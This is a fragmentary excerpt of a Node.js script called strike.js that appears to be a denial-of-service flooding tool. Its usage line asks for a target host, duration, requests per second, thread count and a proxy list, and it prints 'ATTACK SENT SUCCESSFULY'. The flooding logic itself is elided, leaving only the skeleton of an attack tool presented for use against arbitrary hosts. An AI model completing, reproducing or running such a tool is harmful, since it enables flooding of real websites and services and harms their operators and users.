const net = require("net");
 ...
 if (process.argv.length < 7){console.log(gradient.vice(`[!] node strike.js <HOST> <TIME> <RPS> <THREADS> <PROXY>.`));; process.exit();}
 const headers = {};
 ...
 console.log(gradient.vice(`[!] ATTACK SENT SUCCESSFULY`));
